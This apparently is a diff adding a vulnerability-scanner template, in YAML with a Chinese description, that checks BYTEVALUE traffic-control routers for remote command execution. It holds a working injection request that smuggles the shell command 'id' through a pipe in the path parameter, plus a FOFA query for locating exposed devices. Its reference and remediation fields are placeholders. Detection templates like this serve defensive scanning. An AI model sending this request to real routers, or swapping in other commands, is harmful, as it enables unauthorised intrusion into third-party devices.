@@ -1,0 +1,29 @@
+id: BYTEVALUE_RCE
+info:
+  name: BYTEVALUE 智能流控路由器存在远程命令漏洞
+  author: mike
+  severity: info
+  description: BYTEVALUE百为流控路由拥有强大的多线分流,多线叠加负载均衡功能,加上领先的智能流控QOS技术能解决网吧,小区等公共营业场所带宽不够的难题。该路由器存在远程命令执行漏洞。
+  reference: xxx
+  remediation: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: BYTEVALUE 智能流控路由器
+http:
+  - raw:
+      - |
+        GET /goform/webRead/open/?path=|id HTTP/1.1
+        Host: {{Hostname}}  
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "uid"
